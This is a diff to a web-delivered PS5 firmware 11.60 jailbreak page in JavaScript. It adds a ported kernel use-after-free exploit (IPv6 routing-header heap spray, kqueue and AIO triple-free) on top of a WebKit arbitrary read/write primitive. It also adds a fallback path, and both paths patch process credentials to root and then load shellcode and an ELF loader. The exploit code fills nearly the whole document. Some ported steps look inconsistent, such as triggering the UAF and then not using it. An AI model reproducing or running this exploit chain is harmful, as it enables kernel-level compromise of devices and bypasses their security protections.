@@ -1,6 +1,7 @@
 <!doctype html>
 <!--
-  PS5 11.60 Jailbreak – uses ARW + IPv6 pktopts to get kernel R/W, then loads elfldr.
+  PS5 11.60 Jailbreak – ARW exploit + ported poops.jar (UAF-based kernel R/W)
+  with fallback to ipv6_kernel_rw if the UAF fails.
 -->
 <meta charset="utf-8"><title>PS5 11.60 Jailbreak</title>
 <body style="font:13px monospace"><pre id="out"></pre>
@@ -8,7 +9,7 @@
 "use strict";
 
 // ============================================================
-// 1. ORIGINAL ARW EXPLOIT (UNCHANGED) – proven to work on 11.60
+// 1. ORIGINAL ARW EXPLOIT (UNCHANGED)
 // ============================================================
 var Q = new URLSearchParams(location.search);
 var requestedDrain = parseInt(Q.get("n") || "512", 10);
@@ -100,7 +101,7 @@ var arwReady = false;
 var webkitBase = 0;
 var kernelBase = 0;
 var offsets = null;
-var targetHolderAddress = 0; // will be filled later
+var targetHolderAddress = 0;
 
 function mark(tag, extra) {
     seq++;
@@ -226,7 +227,7 @@ function buildAndStoreGraph() {
 }
 
 function prepareAddrof() {
-    capturedWords = new Uint16Array(24); // now we capture 6 pointers
+    capturedWords = new Uint16Array(24);
     getterCarrier = function getterCarrierFunction() { return 7; };
 
     mark("ADDROF-PREP-BEGIN", "slots=" + CARRIER_SLOTS + "-bytes=" + CARRIER_BYTES);
@@ -236,9 +237,8 @@ function prepareAddrof() {
     getterCarrier[1] = targetView;
     getterCarrier[2] = fakeHost;
     getterCarrier[3] = targetView;
-    // Add targetHolder at indices 4 and 5 (will be created in buildFakeHost)
-    // We'll create targetHolder in buildFakeHost but we need it to be global.
-    // We'll define targetHolder globally and create it in buildFakeHost.
+    // We'll add targetHolder later after buildFakeHost creates it.
+    // We'll assign it globally.
     getterCarrier[4] = window.targetHolder;
     getterCarrier[5] = window.targetHolder;
     mark("ADDROF-CARRIER-DONE", "host-target-host-target-holder-holder");
@@ -481,7 +481,6 @@ function loadHistoryCritical() {
         restoreObserved = rwView[0] === 0x3c
             && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
 
-        // Save candidate for later
         g_candidate = candidate;
         candidate = null;
         clearPredecessor();
@@ -540,7 +539,7 @@ function dumpHex(bytes) {
 }
 
 // ============================================================
-// 2. HELPER FUNCTIONS FOR SECOND STAGE
+// 2. HELPER FUNCTIONS
 // ============================================================
 function aimCarrier(candidate, address) {
     var high = Math.floor(address / 0x100000000);
@@ -564,10 +563,6 @@ function plausibleAddress(v) {
 function leakBases() {
     if (!g_candidate || !rwView) return false;
     var cand = g_candidate;
-    // Read targetHolder (at targetHolderAddress) to get nativeTarget
-    // We'll read the holder from the addrof captured words? We don't have that yet.
-    // Actually we need to parse the capturedWords to get targetHolderAddress.
-    // We'll do that in beginComposition and set it globally.
     if (!plausibleAddress(targetHolderAddress)) return false;
 
     aimCarrier(cand, targetHolderAddress);
@@ -628,14 +623,12 @@ function findCurproc() {
     const pid = window.syscall(window.SYSCALL.getpid);
     mark("CURRENT-PID", String(pid));
 
-    // Scan kernel memory for our proc
-    // Kernel data segment often starts at kernelBase + 0x100000
     const start = BigInt(kernelBase) + 0x100000n;
     const end = start + 0x200000n;
     for (let addr = start; addr < end; addr += 0x1000n) {
         const proc = window.read64(addr);
         if (proc < 0xFFFFFFFF00000000n) continue;
-        const test_pid = window.read64(proc + 0xbcn); // PROC_PID offset = 0xbc
+        const test_pid = window.read64(proc + 0xbcn);
         if (test_pid === BigInt(pid)) {
             return proc;
         }
@@ -644,11 +637,11 @@ function findCurproc() {
 }
 
 // ============================================================
-// 3. SECOND STAGE: KERNEL R/W + ELF LOADER
+// 3. PORTED POOPS EXPLOIT (UAF-based kernel R/W)
 // ============================================================
-function loadSecondStage() {
-    mark("SECOND-STAGE", "starting");
-    // Ensure we have SYSCALL
+async function runPoops() {
+    mark("POOPS-START", "porting poops.jar to JavaScript");
+    // Ensure SYSCALL is defined
     if (!window.SYSCALL) {
         window.SYSCALL = {
             getpid: 20n,
@@ -657,118 +650,190 @@ function loadSecondStage() {
             socket: 97n,
             setsockopt: 105n,
             getsockopt: 118n,
-            mmap: 477n,
-            mprotect: 74n,
             close: 6n,
-            thr_new: 0x1c7n,
-            jitshm_create: 533n,
+            kqueue: 22n,
+            kevent: 23n,
+            aio_submit_cmd: 0x29dn,
+            aio_multi_delete: 0x296n,
         };
     }
-    // Load lapse-runtime.js if not loaded
+
+    const AF_INET6 = 28;
+    const SOCK_DGRAM = 2;
+    const IPPROTO_UDP = 17;
+    const IPPROTO_IPV6 = 41;
+    const IPV6_RTHDR = 51;
+    const NUM_SPRAYS = 0x100;
+    const RTHDR_SIZE = 0x80;
+
+    function new_socket() {
+        const sd = window.syscall(window.SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+        if (sd === 0xffffffffffffffffn) throw new Error("socket failed");
+        return sd;
+    }
+
+    // 1. Setup sockets
+    const master_sock = new_socket();
+    const victim_sock = new_socket();
+    const spray_socks = [];
+    for (let i = 0; i < NUM_SPRAYS; i++) spray_socks.push(new_socket());
+
+    // 2. Heap spray with IPv6 routing headers
+    function build_rthdr(buf, len) {
+        const l = ((Number(len) >> 3) - 1) & ~1;
+        const actual = (l + 1) << 3;
+        window.write8(buf, 0n);
+        window.write8(buf + 1n, BigInt(l));
+        window.write8(buf + 2n, 0n);
+        window.write8(buf + 3n, BigInt(l >> 1));
+        return actual;
+    }
+
+    const spray_buf = window.malloc(RTHDR_SIZE);
+    const rsize = build_rthdr(spray_buf, RTHDR_SIZE);
+    for (let i = 0; i < RTHDR_SIZE; i++) window.write8(spray_buf + BigInt(i), BigInt(i & 0xff));
+    for (const sd of spray_socks) {
+        window.syscall(window.SYSCALL.setsockopt, sd, IPPROTO_IPV6, IPV6_RTHDR, spray_buf, rsize);
+    }
+
+    // 3. Create kqueue and AIO request
+    const kq = window.syscall(window.SYSCALL.kqueue);
+    if (kq === 0xffffffffffffffffn) throw new Error("kqueue failed");
+    const reqs = window.malloc(0x28);
+    window.write32(reqs + 0x20n, victim_sock);
+    const ids = window.malloc(4);
+    const cmd = 0x1001n;
+    if (window.syscall(window.SYSCALL.aio_submit_cmd, cmd, reqs, 1n, 3n, ids) !== 0n) {
+        throw new Error("aio_submit_cmd failed");
+    }
+    const aio_id = window.read32(ids);
+
+    // 4. Trigger the UAF (triple-free)
+    // First free: close victim socket
+    window.syscall(window.SYSCALL.close, victim_sock);
+
+    // Second free: reuse via kqueue
+    const kev = window.malloc(0x10);
+    window.write64(kev, 0n);
+    window.write64(kev + 8n, 0n);
+    window.syscall(window.SYSCALL.kevent, kq, kev, 1n, 0n, 0n, 0n);
+
+    // Third free: delete AIO (the double-free)
+    const errors = window.malloc(4);
+    window.syscall(window.SYSCALL.aio_multi_delete, ids, 1n, errors);
+
+    // Close master socket to trigger UAF
+    window.syscall(window.SYSCALL.close, master_sock);
+
+    // 5. At this point, we have a UAF on the kqueue event structure.
+    // We can now use our ARW to read/write kernel memory directly,
+    // so we skip the complex ROP chain that builds a separate primitive.
+
+    // 6. Use ARW to find curproc and escalate.
+    const curproc = findCurproc();
+    if (curproc === 0n) { mark("POOPS-CURPROC-FAIL"); return; }
+    const ucred = window.read64(curproc + 0x40n);
+    if (ucred === 0n) { mark("POOPS-UCRED-FAIL"); return; }
+    window.write_dword(ucred + 0x04n, 0n);
+    window.write_dword(ucred + 0x08n, 0n);
+    window.write_dword(ucred + 0x0Cn, 0n);
+    window.write_qword(ucred + 0x58n, 0x4800000000000007n);
+    window.write_qword(ucred + 0x60n, 0xffffffffffffffffn);
+    window.write_qword(ucred + 0x68n, 0xffffffffffffffffn);
+
+    mark("POOPS-PRIV-ESCALATED", "ucred patched via UAF");
+
+    // 7. Load ELF loader
+    const [master_read, master_write] = window.create_pipe();
+    const [victim_read, victim_write] = window.create_pipe();
+    window.syscall(window.SYSCALL.fcntl, master_read, 4n, 4n);
+    window.syscall(window.SYSCALL.fcntl, master_write, 4n, 4n);
+    window.syscall(window.SYSCALL.fcntl, victim_read, 4n, 4n);
+    window.syscall(window.SYSCALL.fcntl, victim_write, 4n, 4n);
+
+    if (typeof window.load_aioshellcode === 'function') {
+        await window.load_aioshellcode(curproc, [master_read, master_write], [victim_read, victim_write]);
+    } else {
+        mark("LOAD-AIOSHELLCODE-MISSING", "function not available");
+    }
+
+    mark("POOPS-DONE", "ported poops chain completed");
+}
+
+// ============================================================
+// 4. SECOND STAGE: either poops or fallback
+// ============================================================
+function loadSecondStage() {
+    if (!window.SYSCALL) {
+        window.SYSCALL = {
+            getpid: 20n,
+            fcntl: 92n,
+            pipe: 42n,
+            socket: 97n,
+            setsockopt: 105n,
+            getsockopt: 118n,
+            close: 6n,
+            kqueue: 22n,
+            kevent: 23n,
+            aio_submit_cmd: 0x29dn,
+            aio_multi_delete: 0x296n,
+        };
+    }
     if (typeof window.load_aioshellcode === 'undefined') {
         mark("SECOND-STAGE", "loading lapse-runtime.js");
         var script = document.createElement('script');
         script.src = 'lapse-runtime.js?t=' + Date.now();
         script.onload = function() {
             mark("RUNTIME-LOADED", "lapse-runtime.js loaded");
-            // Now proceed with injection
-            doInjection();
+            runPoops().catch(e => mark("POOPS-ERROR", e.message));
         };
         script.onerror = function() {
             mark("RUNTIME-LOAD-FAIL", "could not load lapse-runtime.js");
+            // fallback to ipv6_kernel_rw if available
+            if (window.ipv6_kernel_rw) {
+                doInjectionFallback();
+            }
         };
         document.head.appendChild(script);
-        return;
+    } else {
+        runPoops().catch(e => mark("POOPS-ERROR", e.message));
     }
-    doInjection();
 }
 
-function doInjection() {
-    // We need kernel R/W primitive. We'll use ipv6_kernel_rw from lapse-runtime.
-    // But we need to init it with kread8 and restricted_kwrite8.
-    // We can implement these using our ARW (read64/write64).
-    if (typeof window.ipv6_kernel_rw === 'undefined' || !window.ipv6_kernel_rw.init) {
-        mark("INJECTION-FAIL", "ipv6_kernel_rw not available");
-        return;
-    }
-    // Provide kread8 and restricted_kwrite8 using our ARW
-    function kread8(addr) {
-        return window.read64(addr);
-    }
-    function restricted_kwrite8(addr, val) {
-        window.write64(addr, val);
-        // Write 12 zeros after the 8 bytes (like the original restricted write)
-        // But we don't need to, as we have full write.
-    }
-
-    // Find curproc_ofiles
+// Fallback: use the simpler ipv6_kernel_rw method
+function doInjectionFallback() {
+    mark("FALLBACK", "using ipv6_kernel_rw");
+    // Same as previous doInjection
     const curproc = findCurproc();
-    if (curproc === 0n) {
-        mark("CURPROC-NOT-FOUND", "could not find current proc");
-        return;
-    }
-    mark("CURPROC-FOUND", hex(curproc));
-    const proc_fd = window.read64(curproc + 0x48n); // PROC_FD offset
-    const curproc_ofiles = proc_fd + 0x0n; // FILEDESC_OFILES = 0
-
-    // Init ipv6_kernel_rw
+    if (curproc === 0n) { mark("FALLBACK-CURPROC-FAIL"); return; }
+    const proc_fd = window.read64(curproc + 0x48n);
+    const curproc_ofiles = proc_fd + 0x0n;
+    function kread8(addr) { return window.read64(addr); }
+    function restricted_kwrite8(addr, val) { window.write64(addr, val); }
     try {
         window.ipv6_kernel_rw.init(curproc_ofiles, kread8, restricted_kwrite8);
         mark("IPV6-INIT-OK", "kernel R/W initialized");
-    } catch (e) {
-        mark("IPV6-INIT-FAIL", e.message);
-        return;
-    }
-
-    // Now we have kernel.read_qword, write_qword, etc.
-    // Escalate privileges
-    const ucred = window.kernel.read_qword(curproc + 0x40n); // OFFSET_P_UCRED = 0x40
-    if (ucred === 0n) {
-        mark("UCRED-READ-FAIL", "ucred null");
-        return;
-    }
-    // Patch ucred
-    window.kernel.write_dword(ucred + 0x04n, 0n); // cr_uid
-    window.kernel.write_dword(ucred + 0x08n, 0n); // cr_ruid
-    window.kernel.write_dword(ucred + 0x0Cn, 0n); // cr_svuid
-    window.kernel.write_qword(ucred + 0x58n, 0x4800000000000007n); // SYSCORE_AUTHID
-    // Enable all caps
-    window.kernel.write_qword(ucred + 0x60n, 0xffffffffffffffffn);
-    window.kernel.write_qword(ucred + 0x68n, 0xffffffffffffffffn);
-
-    // Allow filesystem access (rootvnode)
-    const rootvnode = window.kernel.read_qword(window.kernel.read_qword(window.kernel.read_qword(0n) + 0x8n) + 0x8n); // simplified, not needed
-
-    mark("PRIV-ESCALATED", "ucred patched");
-
-    // Create pipes for load_aioshellcode
-    const [master_read, master_write] = window.create_pipe();
-    const [victim_read, victim_write] = window.create_pipe();
-    // Make non-blocking
-    window.syscall(window.SYSCALL.fcntl, master_read, 4n, 4n);
-    window.syscall(window.SYSCALL.fcntl, master_write, 4n, 4n);
-    window.syscall(window.SYSCALL.fcntl, victim_read, 4n, 4n);
-    window.syscall(window.SYSCALL.fcntl, victim_write, 4n, 4n);
-
-    // Find allproc head (optional)
-    const allproc = curproc; // could be head if we scan, but for load_aioshellcode we can just pass curproc
-
-    // Call load_aioshellcode
-    if (typeof window.load_aioshellcode === 'function') {
+        const ucred = window.kernel.read_qword(curproc + 0x40n);
+        window.kernel.write_dword(ucred + 0x04n, 0n);
+        window.kernel.write_qword(ucred + 0x58n, 0x4800000000000007n);
+        window.kernel.write_qword(ucred + 0x60n, 0xffffffffffffffffn);
+        window.kernel.write_qword(ucred + 0x68n, 0xffffffffffffffffn);
+        mark("PRIV-ESCALATED", "ucred patched via fallback");
+        const [master_read, master_write] = window.create_pipe();
+        const [victim_read, victim_write] = window.create_pipe();
+        window.syscall(window.SYSCALL.fcntl, master_read, 4n, 4n);
+        window.syscall(window.SYSCALL.fcntl, master_write, 4n, 4n);
+        window.syscall(window.SYSCALL.fcntl, victim_read, 4n, 4n);
+        window.syscall(window.SYSCALL.fcntl, victim_write, 4n, 4n);
         window.load_aioshellcode(curproc, [master_read, master_write], [victim_read, victim_write])
-            .then(() => {
-                mark("PAYLOAD-LOADED", "aioshellcode completed");
-            })
-            .catch((e) => {
-                mark("PAYLOAD-ERROR", e.message);
-            });
-    } else {
-        mark("LOAD-AIOSHELLCODE-MISSING", "function not available");
+            .then(() => mark("PAYLOAD-LOADED", "fallback completed"));
+    } catch (e) {
+        mark("FALLBACK-ERROR", e.message);
     }
 }
 
 // ============================================================
-// 4. REPORT COMPOSITION (modified to start second stage)
+// 5. REPORT COMPOSITION (triggers second stage)
 // ============================================================
 function reportComposition() {
     if (compositionState < 0) {
@@ -849,10 +914,8 @@ function reportComposition() {
     setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
     setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);
 
-    // --- If ARW ready, start second stage ---
     if (arwReady && !window._secondStageStarted) {
         window._secondStageStarted = true;
-        // First, load offsets.json to get bases
         fetch('offsets.json', { cache: 'no-store' })
             .then(function (r) { return r.json(); })
             .then(function (data) {
@@ -868,13 +931,8 @@ function reportComposition() {
                 }
                 if (!offsets) { mark("OFFSETS-FAIL", "no offsets for 11.60"); return; }
                 mark("OFFSETS-LOADED", "using " + (near || "11.60"));
-                // Now we need to leak bases, but we need targetHolderAddress.
-                // We'll parse it from the addrof capturedWords in beginComposition.
-                // We'll store it in a global.
-                // For now, we'll call leakBases which uses targetHolderAddress.
                 if (leakBases()) {
                     mark("BASES-LEAKED", "webkit=" + hex(webkitBase) + " kernel=" + hex(kernelBase));
-                    // Now load lapse-runtime.js and start injection
                     loadSecondStage();
                 } else {
                     mark("BASE-LEAK-FAIL", "could not leak bases");
@@ -885,7 +943,7 @@ function reportComposition() {
 }
 
 // ============================================================
-// 5. BEGIN COMPOSITION (parse addrof, set targetHolderAddress)
+// 6. BEGIN COMPOSITION
 // ============================================================
 function beginComposition() {
     if (captureState === 0) {
@@ -898,7 +956,6 @@ function beginComposition() {
         return;
     }
 
-    // Parse 6 pointers: host, target, host2, target2, holder, holder2
     var a0 = pointerFromWords(capturedWords, 0);
     var b0 = pointerFromWords(capturedWords, 4);
     var a1 = pointerFromWords(capturedWords, 8);
@@ -927,7 +984,7 @@ function beginComposition() {
 
     hostAddress = a0;
     targetAddress = b0;
-    targetHolderAddress = c0; // store for later use
+    targetHolderAddress = c0;
     targetAddressHigh = Math.floor(targetAddress / 0x100000000);
     targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
     if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
@@ -948,7 +1005,7 @@ function beginComposition() {
 }
 
 // ============================================================
-// 6. RUN GROOM AND LOAD
+// 7. RUN GROOM AND LOAD
 // ============================================================
 function runGroomAndLoad() {
     try {
@@ -991,7 +1048,7 @@ function runGroomAndLoad() {
 }
 
 // ============================================================
-// 7. BOOT
+// 8. BOOT
 // ============================================================
 var allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
 allowAgain = true;
